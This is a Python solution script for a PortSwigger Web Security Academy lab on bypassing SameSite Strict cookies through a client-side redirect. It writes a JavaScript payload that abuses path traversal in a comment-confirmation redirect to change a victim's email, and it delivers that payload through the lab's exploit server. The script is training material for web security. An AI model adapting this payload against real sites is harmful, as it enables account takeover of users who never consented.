##################################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 24/10/2023
#
# Lab: SameSite Strict bypass via client-side redirect
#
# Steps: 1. Exploit the redirection functionality that occurs after a comment is submitted
#           in order to redirect the victim to their profile and change their email using
#           URL parameters
#        2. Deliver the exploit to the victim
#        3. The victim's email will be changed after he trigger the exploit
#
##################################################################################################


###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########

# change this to your lab URL
lab_url = "https://0a91002303fb116b8046e93d00d5000e.web-security-academy.net"

# change this to your exploit server URL
exploit_server_url = "https://exploit-0a430021034f11ec8008e879019b0041.exploit-server.net"

# the header of your exploit sever response
exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    
# the new email
# you can change this to what you want
new_email = "hacked@you.com"

# payload to change the victim's email
payload = f"""<script>
                location = "{lab_url}/post/comment/confirmation?postId=../my-account/change-email%3femail=hacked%40you.com%26submit=1"
            </script>"""

# data to send via POST
data = {
    "formAction": "DELIVER_TO_VICTIM",
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": exploit_server_head,
    "responseBody": payload,
}

try:
    # deliver the exploit to the victim
    res = requests.post(exploit_server_url, data)

except:
    print(Fore.RED + "[!] Failed to deliver the exploit to the victim through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Delivering the exploit to the victim.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The victim's email will be changed after he trigger the exploit") 
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



